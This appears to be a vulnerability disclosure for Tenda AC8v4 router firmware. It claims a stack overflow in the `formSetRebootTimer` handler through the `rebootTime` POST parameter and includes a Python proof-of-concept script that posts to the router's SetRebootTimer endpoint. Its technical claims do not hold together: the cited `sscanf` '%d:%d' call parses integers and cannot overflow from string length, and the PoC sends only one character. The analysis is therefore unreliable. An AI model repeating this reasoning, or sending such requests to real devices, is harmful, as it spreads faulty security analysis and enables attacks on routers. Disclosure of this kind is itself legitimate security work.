## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3683.html

## Affected version

AC8v4 V16.03.34.09

## Vulnerability details

The Tenda AC8v4 V16.03.34.09 firmware has a stack overflow vulnerability in the `formSetRebootTimer` function. The `v4` variable receives the `rebootTime` parameter from a POST request and is later assigned to the function `sub_4A8838(v4);`. However, since the user can control the input of `rebootTime`, the statement `v1 = sscanf(a1, "%d:%d", &v3, &v4);` can cause a buffer overflow. The user-provided  `rebootTime` can exceed the capacity of the `v3, v4` array, triggering this security vulnerability.

![image-20240415132942840](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415132942840.png)

![image-20240415133115939](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415133115939.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetRebootTimer"
payload = "a"*1

data = {"rebootTime": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240415125733742](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240415125733742.png)